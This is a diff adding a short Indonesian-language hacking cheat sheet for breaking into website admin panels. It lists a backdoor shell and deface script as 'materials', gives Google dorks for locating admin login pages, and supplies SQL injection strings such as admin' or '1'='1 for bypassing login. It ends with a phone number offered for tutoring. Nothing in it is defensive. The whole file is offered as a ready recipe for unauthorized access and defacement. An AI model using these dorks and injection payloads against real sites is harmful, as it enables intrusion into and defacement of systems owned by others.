@@ -1,0 +1,36 @@
+
+bahan:
+      1. internet
+      2. kopi
+      3. shell backdor
+      4. script deface
+      5. dork
+      6. passwors bypas
+
+Dork:
+     inurl:/admin login site:in 
+     inurl:/login/login.php admin 
+     inurl:/admin/login.asp 
+     inurl:/admin/index.aspx 
+     inurl:admin intext:login
+     index of admin.php 
+     index of /admin/ login.php 
+     intitle:"admin panel" login 
+     inurl/admin/admin/login.php
+
+Exploit:
+        site.com/admin
+        site.com/login.php
+
+password:
+         admin' # 
+         admin' or '1'='1
+         admin' or '1'='1'#
+         admin' or 1=1 or ''=' 
+         or 1=1 limit 1 -- -+
+         '=''or'
+         '=''or'@email.com
+         Mm
+
+info tutor:
+	   088212171828
